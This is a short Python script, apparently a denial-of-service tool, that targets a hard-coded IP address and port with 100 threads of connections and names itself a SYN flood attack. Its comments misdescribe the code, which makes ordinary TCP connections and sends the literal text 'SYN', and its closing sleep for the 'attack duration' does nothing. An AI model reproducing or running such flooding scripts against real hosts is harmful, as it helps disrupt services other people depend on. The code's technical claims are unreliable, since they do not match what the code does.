import socket
import threading
import time

# Define the target IP address and port
target_ip = "192.168.1.1"
target_port = 80

# Define the attack duration in seconds
attack_duration = 60

# Create a function to send a single SYN packet
def attack():
    # Create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target
    sock.connect((target_ip, target_port))

    # Send a SYN packet
    sock.send(b"SYN")

    # Close the socket
    sock.close()

# Create a thread pool to send multiple SYN packets
threads = []
for i in range(100):
    t = threading.Thread(target=attack)
    threads.append(t)

# Start the threads
for t in threads:
    t.start()

# Join the threads
for t in threads:
    t.join()

# Sleep for the specified attack duration
time.sleep(attack_duration)